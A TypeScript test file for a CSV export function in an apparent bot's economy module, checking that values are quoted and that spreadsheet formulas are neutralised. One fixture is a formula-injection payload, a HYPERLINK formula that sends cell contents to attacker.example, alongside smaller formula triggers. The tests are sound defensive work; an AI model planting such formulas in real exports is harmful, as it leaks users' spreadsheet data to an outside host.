import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import type { Transaction } from '@maxwell/core/stores/economy';
import { transactionRow } from '../lib/economy-export';

const guildId = '900000000000000004';
const head = '42,2026-10-26T12:00:00.000Z,900000000000000010,-50,-5';
const tail = '900000000000000011';

function transaction(patch: Partial<Transaction> = {}): Transaction {
  return {
    id: '42',
    guildId,
    userId: '900000000000000010',
    amount: -50,
    balance: -5,
    kind: 'admin',
    note: null,
    ref: null,
    counterpartId: tail,
    createdAt: new Date('2026-10-26T12:00:00.000Z'),
    ...patch,
  };
}

describe('economy export rows', () => {
  it('keeps numbers, ids and timestamps unchanged', () => {
    assert.equal(transactionRow(transaction()), `${head},admin,,,${tail}`);
    assert.equal(
      transactionRow(transaction({ amount: 1.5, balance: 0, counterpartId: null })),
      '42,2026-10-26T12:00:00.000Z,900000000000000010,1.5,0,admin,,,',
    );
  });

  it('writes ordinary text as before', () => {
    assert.equal(
      transactionRow(transaction({ kind: 'shop', note: 'Prize, round 2', ref: 'say "hi"' })),
      `${head},shop,"Prize, round 2","say ""hi""",${tail}`,
    );
    assert.equal(
      transactionRow(transaction({ note: 'a=b', ref: 'x-1' })),
      `${head},admin,a=b,x-1,${tail}`,
    );
  });

  it('neutralises formulas in kind, note and ref', () => {
    const note = '=HYPERLINK("https://attacker.example/?d="&B2&C2,"Click for details")';
    assert.equal(
      transactionRow(transaction({ note })),
      `${head},admin,"'=HYPERLINK(""https://attacker.example/?d=""&B2&C2,""Click for details"")",,${tail}`,
    );
    for (const value of ['=1+1', '+1', '-50', '@SUM(A1)', '\t=1']) {
      assert.equal(
        transactionRow(transaction({ kind: value, note: value, ref: value })),
        `${head},'${value},'${value},'${value},${tail}`,
      );
    }
  });

  it('quotes carriage returns', () => {
    assert.equal(
      transactionRow(transaction({ note: '\r=1', ref: 'a\rb' })),
      `${head},admin,"'\r=1","a\rb",${tail}`,
    );
  });
});
